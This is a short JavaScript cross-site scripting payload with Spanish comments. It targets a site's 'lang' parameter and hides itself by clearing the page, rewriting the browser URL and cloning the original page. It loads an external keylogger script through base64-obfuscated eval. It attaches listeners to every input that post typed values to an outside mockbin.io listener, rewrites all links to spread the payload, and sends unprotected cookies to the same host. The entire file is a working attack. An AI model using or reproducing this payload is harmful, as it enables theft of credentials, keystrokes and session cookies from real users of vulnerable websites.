var https_listener_for_logging = 'https://1f84a21f49834055849d5bce74489025.api.mockbin.io/'
var param_vuln = 'lang'
var payload_vuln = "\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))"
// Borramos el contenido para que parezca que sigue cargando
document.body.innerHTML = '';
// Esto cambia la URL que muestra el navegador, para que no se vea el payload
let newUrl = new URL(window.location.href)
newUrl.searchParams.set(param_vuln, '')
history.pushState({ path: newUrl.href }, '', newUrl.href);

//Clona la web original
fetch(newUrl.href)
    .then(response => { return response.text() })
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        document.body.innerHTML = doc.body.innerHTML;
        document.head.innerHTML = doc.head.innerHTML;
    }).then(() => {
        //Finalmente agrega el keylogger
        var inputs = document.querySelectorAll('input');
        inputs.forEach(i => {
            i.addEventListener("blur", (event) => {
                fetch(https_listener_for_logging, {
                    method: "POST", body: JSON.stringify({ "log": i.value, 'url': newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
                })
            })
        });
        // Envenena los links
        var links = document.querySelectorAll('a');
        links.forEach(a => {
            let l_url = new URL(a.href)
            l_url.searchParams.set(param_vuln, payload_vuln)
            a.setAttribute('href',l_url.href)
        });
        // Envía las cookies que no estén protegidas
        fetch(https_listener_for_logging, {
                    method: "POST", body: JSON.stringify({ "cookies": document.cookie, 'url': document.baseURI, "timestamp": Date.now() }),
                })
        console.clear();
    })
    .catch();
